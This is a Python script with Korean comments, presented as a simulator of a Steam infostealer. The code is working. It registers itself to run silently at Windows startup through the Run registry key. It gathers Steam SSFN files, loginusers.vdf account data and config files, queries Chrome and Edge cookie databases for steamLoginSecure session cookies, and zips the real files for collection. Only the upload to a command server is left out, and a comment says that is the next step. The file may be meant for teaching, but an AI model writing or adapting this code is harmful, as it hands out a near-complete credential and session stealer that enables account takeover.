import os
import winreg
import sqlite3
import zipfile
import shutil
from datetime import datetime
from colorama import Fore, Style
import re
import sys
import argparse
import glob

def get_steam_path_from_registry():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as key:
            return winreg.QueryValueEx(key, 'SteamPath')[0]
    except Exception:
        return None

STEAM_INSTALL_PATH = get_steam_path_from_registry()
if not STEAM_INSTALL_PATH:
    STEAM_INSTALL_PATH = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), "Steam")
    print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Steam 경로를 레지스트리에서 찾을 수 없어 기본값 '{STEAM_INSTALL_PATH}'을 사용합니다.")

# 브라우저 프로필 경로
# 각 브라우저의 'User Data' 기본 경로만 정의하고, 내부 프로필은 함수에서 탐색
BROWSER_USER_DATA_PATHS = {
    "Chrome": os.path.join(os.environ.get('USERPROFILE', ''), "AppData", "Local", "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.environ.get('USERPROFILE', ''), "AppData", "Local", "Microsoft", "Edge", "User Data"),
}

# --- 로깅 헬퍼 함수 ---
silent_mode_enabled = False

def log_message(level, message):
    if silent_mode_enabled and level in ["INFO", "WARNING"]:
        return
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    color = {
        "INFO": Fore.CYAN,
        "OK": Fore.GREEN,
        "WARNING": Fore.YELLOW,
        "ERROR": Fore.RED
    }.get(level, Fore.WHITE)
    print(f"{Style.DIM}{current_time} - {Style.RESET_ALL}{Style.BRIGHT}{color}[{level}]{Style.RESET_ALL}{Style.BRIGHT}{Fore.WHITE} {message}{Style.RESET_ALL}")

# --- 지속성(Persistence) 및 은닉성(Stealth) 함수 ---

def enable_persistence(script_path, key_name="SessionProbeSimulator"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        
        python_exec = sys.executable
        if python_exec.lower().endswith('python.exe'):
            python_exec = python_exec.replace('python.exe', 'pythonw.exe')
        
        # 기존: command = f'"{python_exec}" "{script_path}" --run --silent' 
        # 변경: 스크립트가 실행되기 전에 해당 스크립트의 디렉토리로 CWD를 변경하도록 합니다.
        # cmd /c: 명령 프롬프트를 통해 명령을 실행
        # cd /d "{os.path.dirname(script_path)}": 스크립트 파일이 있는 디렉토리로 이동 (드라이브 변경도 가능)
        command = f'cmd /c "cd /d "{os.path.dirname(script_path)}" && "{python_exec}" "{script_path}" --run --silent"' 
        
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        log_message("OK", f"시작 프로그램에 '{key_name}' 등록 성공: '{command}'")
        return True
    except Exception as e:
        log_message("ERROR", f"시작 프로그램 등록 실패: {e}. 관리자 권한이 필요할 수 있습니다.")
        return False

def disable_persistence(key_name="SessionProbeSimulator"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, key_name)
        winreg.CloseKey(key)
        log_message("OK", f"시작 프로그램에서 '{key_name}' 제거 성공.")
        return True
    except FileNotFoundError:
        log_message("INFO", f"시작 프로그램에 '{key_name}'이 등록되어 있지 않습니다.")
        return True
    except Exception as e:
        log_message("ERROR", f"시작 프로그램 제거 실패: {e}")
        return False

# --- 정보 수집 함수들 ---

def probe_ssfn_files():
    log_message("INFO", "--- SSFN 파일 탐색 시작 ---")
    ssfn_dir = STEAM_INSTALL_PATH
    if not os.path.exists(ssfn_dir):
        log_message("ERROR", f"Steam 설치 경로를 찾을 수 없습니다: {ssfn_dir}")
        return []

    found_ssfns = []
    try:
        ssfn_pattern = os.path.join(ssfn_dir, 'ssfn*')
        for file_path in glob.glob(ssfn_pattern):
            if os.path.isfile(file_path):
                file_size = os.path.getsize(file_path)
                mod_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                log_message("INFO", f"   - SSFN 파일 발견: '{os.path.basename(file_path)}' (크기: {file_size} bytes, 수정일: {mod_time})")
                found_ssfns.append(file_path)
        if not found_ssfns:
            log_message("WARNING", "   SSFN 파일을 찾을 수 없습니다. Steam이 설치되지 않았거나 파일이 삭제되었을 수 있습니다.")
    except Exception as e:
        log_message("ERROR", f"SSFN 파일 탐색 중 오류 발생: {e}")
    return found_ssfns

def probe_loginusers_vdf():
    log_message("INFO", "--- loginusers.vdf 파일 탐색 및 파싱 ---")
    vdf_path = os.path.join(STEAM_INSTALL_PATH, "config", "loginusers.vdf")
    parsed_data = {}

    if not os.path.exists(vdf_path):
        log_message("WARNING", f"loginusers.vdf 파일을 찾을 수 없습니다: {vdf_path}")
        return None

    log_message("INFO", f"   - loginusers.vdf 파일 발견: '{vdf_path}'")
    try:
        with open(vdf_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

            log_message("INFO", "   - 파일 내용에서 핵심 정보 키워드 탐색:")
            # SteamID64 추출 (users 섹션 아래의 숫자 키)
        steamid_match = re.search(r'"users"\s*\{\s*\t*"(\d+)"', content)
        if steamid_match:
            parsed_data["SteamID64_from_VDF"] = steamid_match.group(1)
            log_message("INFO", f"     - 'SteamID64_from_VDF': '{steamid_match.group(1)}'")
        else:
            log_message("INFO", "     - 'SteamID64_from_VDF': 찾을 수 없음")

        # 기타 키워드 추출 (AccountName, RememberPassword 등)
        keywords = ["AccountName", "PersonaName", "RememberPassword", "WantsOfflineMode", "AllowAutoLogin"]
        for keyword in keywords:
            # VDF 파일의 들여쓰기를 고려하여 정규식 수정 (\t\t는 탭 2개)
            match = re.search(fr'\t\t"{re.escape(keyword)}"\s+"([^"]+)"', content)
            if match:
                parsed_data[keyword] = match.group(1)
                log_message("INFO", f"     - '{keyword}': '{match.group(1)}'")
            else:
                log_message("INFO", f"     - '{keyword}': 찾을 수 없음")
                
        if not parsed_data:
            log_message("WARNING", "loginusers.vdf 파일을 찾았지만, 유효한 계정 정보를 파싱할 수 없습니다. (내용이 없거나 형식이 다를 수 있음)")
            return {}
        else:
            return parsed_data

    except Exception as e:
        log_message("ERROR", f"loginusers.vdf 파싱 중 오류 발생: {e}")
        return {}


def probe_config_files():
    log_message("INFO", "--- Steam config 폴더 내 파일 탐색 ---")
    config_dir = os.path.join(STEAM_INSTALL_PATH, "config")
    if not os.path.exists(config_dir):
        log_message("ERROR", f"Steam config 폴더를 찾을 수 없습니다: {config_dir}")
        return []

    found_config_files = []
    try:
        for filename in os.listdir(config_dir):
            file_path = os.path.join(config_dir, filename)
            if os.path.isfile(file_path) and filename.lower() != 'loginusers.vdf':
                file_size = os.path.getsize(file_path)
                log_message("INFO", f"   - config 파일 발견: '{filename}' (크기: {file_size} bytes)")
                found_config_files.append(file_path)
    except Exception as e:
        log_message("ERROR", f"config 폴더 파일 탐색 중 오류 발생: {e}")
    return found_config_files

def probe_browser_cookies():
    log_message("INFO", "--- 브라우저 쿠키 탐색 (Steam Login Secure) ---")
    found_cookies = {}
    
    # 모든 브라우저의 'User Data' 경로를 순회
    for browser_name, user_data_path in BROWSER_USER_DATA_PATHS.items():
        if not os.path.exists(user_data_path):
            log_message("WARNING", f"   - {browser_name} User Data 폴더를 찾을 수 없습니다: {user_data_path}")
            continue

        log_message("INFO", f"   - {browser_name} User Data 폴더 탐색: {user_data_path}")
        
        # 'User Data' 폴더 내의 모든 프로필 폴더 탐색 (Default, Profile 1, Profile 5 등)
        for profile_dir_name in os.listdir(user_data_path):
            if profile_dir_name.startswith("Profile ") or profile_dir_name == "Default":
                profile_path = os.path.join(user_data_path, profile_dir_name)
                cookie_db_path = os.path.join(profile_path, "Network", "Cookies")

                if not os.path.exists(cookie_db_path):
                    log_message("INFO", f"     - {browser_name} 프로필 '{profile_dir_name}'에서 쿠키 DB를 찾을 수 없습니다: {cookie_db_path}")
                    continue

                log_message("INFO", f"     - {browser_name} 프로필 '{profile_dir_name}' 쿠키 DB 발견: '{cookie_db_path}'")
                
                temp_db_path = os.path.join(os.path.dirname(cookie_db_path), f"Cookies_temp_{os.getpid()}")
                try:
                    shutil.copyfile(cookie_db_path, temp_db_path)
                    conn = sqlite3.connect(temp_db_path)
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT name, host_key, path, encrypted_value FROM cookies WHERE name = 'steamLoginSecure'")
                    rows = cursor.fetchall()
                    
                    if rows:
                        for row in rows:
                            cookie_name, host, path, encrypted_value = row
                            log_message("OK", f"       - 'steamLoginSecure' 쿠키 발견 ({browser_name}, 프로필 '{profile_dir_name}'): Host='{host}', Path='{path}', 값 길이={len(encrypted_value)} bytes")
                            log_message("WARNING", "         - 참고: 'encrypted_value'는 OS API로 암호화되어 있어 파이썬에서 직접 복호화하기 어렵습니다. 멀웨어는 이를 자체적으로 처리하거나 다른 도구를 활용합니다.")
                            found_cookies[f"{browser_name}_{profile_dir_name}"] = {"name": cookie_name, "host": host, "path": path, "encrypted_value_len": len(encrypted_value)}
                    else:
                        log_message("INFO", f"       - {browser_name} 프로필 '{profile_dir_name}'에서 'steamLoginSecure' 쿠키를 찾을 수 없습니다.")
                    
                    conn.close()
                except sqlite3.Error as e:
                    log_message("ERROR", f"     - {browser_name} 프로필 '{profile_dir_name}' 쿠키 DB 접근 오류: {e} (브라우저가 실행 중이거나 DB가 잠겨있을 수 있습니다.)")
                except Exception as e:
                    log_message("ERROR", f"     - {browser_name} 프로필 '{profile_dir_name}' 쿠키 탐색 중 알 수 없는 오류: {e}")
                finally:
                    if os.path.exists(temp_db_path):
                        os.remove(temp_db_path)
    return found_cookies

def collect_and_zip_data(output_dir="session_probe_data"):
    global silent_mode_enabled
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)

    if silent_mode_enabled:
        log_message("OK", f"백그라운드 정보 수집 시작: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        log_message("INFO", f"--- 수집된 정보 ZIP으로 압축 ({output_dir}) ---")

    if not os.path.exists(output_dir):
        try:
            os.makedirs(output_dir)
            if not silent_mode_enabled:
                log_message("INFO", f"   - 출력 디렉토리 생성: {output_dir}")
        except Exception as e:
            log_message("ERROR", f"출력 디렉토리 생성 실패: {output_dir} - {e}. 권한 문제일 수 있습니다.")
            return

    summary_file_name = f"session_probe_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    summary_file_path = os.path.join(output_dir, summary_file_name)
    
    all_collected_files = []

    try:
        with open(summary_file_path, "w", encoding="utf-8") as f_summary:
            f_summary.write("--- Session Probe Simulator Summary ---\n\n")
            
            f_summary.write("### SSFN Files ###\n")
            ssfn_files = probe_ssfn_files()
            if ssfn_files:
                for s_path in ssfn_files:
                    f_summary.write(f"- {s_path}\n")
                    all_collected_files.append({"path": s_path, "zip_path": os.path.join("Steam_Data", "SSFN_Files", os.path.basename(s_path))})
            else:
                f_summary.write("- SSFN 파일을 찾을 수 없습니다.\n")
            f_summary.write("\n")

            f_summary.write("### loginusers.vdf ###\n")
            vdf_parsed = probe_loginusers_vdf()
            if vdf_parsed is not None:
                if vdf_parsed:
                    for key, value in vdf_parsed.items():
                        f_summary.write(f"- {key}: {value}\n")
                    vdf_orig_path = os.path.join(STEAM_INSTALL_PATH, "config", "loginusers.vdf")
                    if os.path.exists(vdf_orig_path):
                        all_collected_files.append({"path": vdf_orig_path, "zip_path": os.path.join("Steam_Data", "Config_Files", os.path.basename(vdf_orig_path))})
                        f_summary.write("- loginusers.vdf 파일을 성공적으로 수집했습니다.\n")
                    else:
                        f_summary.write("- loginusers.vdf 파일은 찾았으나, 경로에서 실제 파일을 찾을 수 없습니다.\n")
                else:
                    f_summary.write("- loginusers.vdf 파일을 찾았지만, 유효한 계정 정보를 파싱할 수 없습니다. (내용이 없거나 형식이 다를 수 있음)\n")
            else:
                f_summary.write("- loginusers.vdf 파일을 찾을 수 없습니다.\n")
            f_summary.write("\n")

            f_summary.write("### Steam config Folder Files ###\n")
            config_files = probe_config_files()
            if config_files:
                for cf_path in config_files:
                    f_summary.write(f"- {cf_path}\n")
                    all_collected_files.append({"path": cf_path, "zip_path": os.path.join("Steam_Data", "Config_Files", os.path.basename(cf_path))})
            else:
                f_summary.write("- config 폴더 내 파일을 찾을 수 없습니다.\n")
            f_summary.write("\n")

            f_summary.write("### Browser Cookies (steamLoginSecure) ###\n")
            browser_cookies_info = probe_browser_cookies()
            if browser_cookies_info:
                for browser_profile_name, cookie_data in browser_cookies_info.items():
                    f_summary.write(f"- {browser_profile_name}: Host='{cookie_data['host']}', Path='{cookie_data['path']}', Encrypted_Value_Length={cookie_data['encrypted_value_len']} bytes\n")
                    # ZIP에 추가할 쿠키 DB 원본 경로를 찾기 위해, 복사본을 만들었던 경로를 다시 추적
                    # 주의: 이 로직은 `probe_browser_cookies`가 `original_cookie_db_path`를 직접 반환하지 않으므로, 추정치로 다시 생성
                    # 더 견고하게 하려면 probe_browser_cookies가 원본 경로도 함께 반환해야 합니다.
                    # 여기서는 간단히 다시 경로 조합
                    browser_name = browser_profile_name.split('_')[0] # 'Chrome_Default' -> 'Chrome'
                    profile_name = browser_profile_name.split('_')[1] # 'Chrome_Default' -> 'Default'
                    # 모든 프로필 탐색 로직이므로, BROWSER_USER_DATA_PATHS와 profile_name 조합
                    original_cookie_db_path = os.path.join(BROWSER_USER_DATA_PATHS[browser_name], profile_name, "Network", "Cookies")
                    if os.path.exists(original_cookie_db_path):
                        all_collected_files.append({"path": original_cookie_db_path, "zip_path": os.path.join("Browser_Data", browser_profile_name, "Cookies")})
            else:
                f_summary.write("- 'steamLoginSecure' 쿠키를 찾을 수 없습니다.\n")
            f_summary.write("\n")

        if not silent_mode_enabled:
            log_message("INFO", f"   - 수집 요약 파일 생성: '{summary_file_path}'")

        zip_filename_final = os.path.join(output_dir, f"collected_session_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
        
        with zipfile.ZipFile(zip_filename_final, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(summary_file_path, os.path.basename(summary_file_path))

            for item in all_collected_files:
                if os.path.exists(item['path']):
                    if "Network\\Cookies" in item['path'] or "Network/Cookies" in item['path']:
                        temp_copy_path = os.path.join(output_dir, os.path.basename(item['path']) + f"_temp_copy_{os.getpid()}")
                        shutil.copyfile(item['path'], temp_copy_path)
                        zf.write(temp_copy_path, item['zip_path'])
                        os.remove(temp_copy_path)
                    else:
                        zf.write(item['path'], item['zip_path'])
                else:
                    if not silent_mode_enabled:
                        log_message("WARNING", f"   - ZIP에 추가할 파일을 찾을 수 없습니다 (건너뜀): {item['path']}")

        if not silent_mode_enabled:
            log_message("OK", f"   - 모든 데이터가 '{zip_filename_final}' (ZIP)으로 압축 완료.")
            log_message("INFO", "   - 이 ZIP 파일이 실제 악성코드에 의해 외부 C&C 서버로 전송될 것입니다.")
        else:
            log_message("OK", f"백그라운드 정보 수집 및 압축 완료: {zip_filename_final}")

    except Exception as e:
        log_message("ERROR", f"데이터 수집/압축 중 치명적인 오류 발생: {e}")
        if not silent_mode_enabled:
            log_message("ERROR", "권한 부족 문제일 수 있습니다. 관리자 권한으로 실행했는지 확인하세요.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="인포스틸러의 Steam 세션 정보 수집을 모의하는 시뮬레이터.")
    parser.add_argument('--install', action='store_true', help="시작 프로그램에 등록합니다.")
    parser.add_argument('--uninstall', action='store_true', help="시작 프로그램에서 등록을 제거합니다.")
    parser.add_argument('--run', action='store_true', help="정보 수집 및 압축 시뮬레이션을 실행합니다. (기본 동작)")
    parser.add_argument('--silent', action='store_true', help="콘솔 출력을 최소화합니다. 백그라운드 실행 시 사용.")
    
    args = parser.parse_args()

    if args.silent:
        silent_mode_enabled = True

    if not any([args.install, args.uninstall, args.run]):
        args.run = True

    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)


    if not silent_mode_enabled:
        log_message("INFO", "--- Session Probe Simulator 시작 ---")
        log_message("INFO", "이 시뮬레이터는 악성코드가 Steam 및 브라우저 세션 정보를 어떻게 탐색하고 수집할 수 있는지 보여줍니다.")
        log_message("WARNING", "관리자 권한으로 실행하는 것을 권장합니다.")
    else:
        pass 

    current_script_path = os.path.abspath(__file__)

    if args.install:
        enable_persistence(current_script_path)
    elif args.uninstall:
        disable_persistence()
    elif args.run:
        collect_and_zip_data()

    if not silent_mode_enabled:
        log_message("INFO", "\n--- Session Probe Simulator 종료 ---")
        log_message("INFO", "이 시뮬레이션은 악성코드의 동작 원리를 모의하며, 실제 데이터를 유출하지 않습니다.")
        log_message("INFO", "생성된 ZIP 파일은 안전하며, 분석 목적으로만 사용됩니다.")
    else:
        pass